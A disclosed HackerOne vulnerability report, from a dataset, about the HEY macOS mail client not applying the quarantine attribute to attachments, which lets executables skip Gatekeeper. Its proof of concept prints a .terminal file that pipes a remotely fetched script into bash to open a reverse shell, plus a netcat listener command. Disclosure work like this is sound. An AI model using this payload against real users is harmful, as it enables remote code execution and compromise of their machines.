---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1019389'
original_report_id: '1019389'
title: Lack of quarantine macOS attribute(com.apple.quarantine) leads multiple issues
  including RCE
team_handle: basecamp
created_at: '2020-10-26T22:13:23.874Z'
disclosed_at: '2021-04-22T05:59:01.483Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 26
asset_identifier: HEY.app
asset_type: DOWNLOADABLE_EXECUTABLES
max_severity: critical
tags:
- hackerone
---

# Lack of quarantine macOS attribute(com.apple.quarantine) leads multiple issues including RCE

## Metadata

- HackerOne Report ID: 1019389
- Weakness: 
- Program: basecamp
- Disclosed At: 2021-04-22T05:59:01.483Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi, basecamp team.

HEY macOS client does not properly validate file uploads on its macOS inbox. That is because, by not setting the `com.apple.quarantine` attribute in the metadata of an executable file when it is uploaded, you allow the file to be executed on macOS without being checked by Gatekeeper.

Basically, the bug here is that when sending an executable as a message, when opening it, the "file cannot be opened because it is from an unidentified developer" doesn't pop-up, the executable just gets executed

As a PoC(i prepared a video) I used a `.terminal` file, containing a backdoor payload.

# Steps-to Reproduce

1) Create a .terminal file with the following code:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>curl -Ls https://git.io/vXd2N | bash -s localhost 80 > exploit.sh;</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
```
2) Send a mail with that file as an attachment
3) open another terminal window and execute: `nc -nvl 80`
4) As a victim download and open `.terminal` file, this will gain you a shell from the terminal window were you executed `nc -nvl 80`. As you can see, there is no alert for running Executable

# PoC video

{F1052935}

# For Further Info

for further info check the following reports from the person who found this vulnerability:

- https://hackerone.com/reports/470637
- https://hackerone.com/reports/430463

## Impact

An attacker can execute code on the victim's computer via the HEY macOS app.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
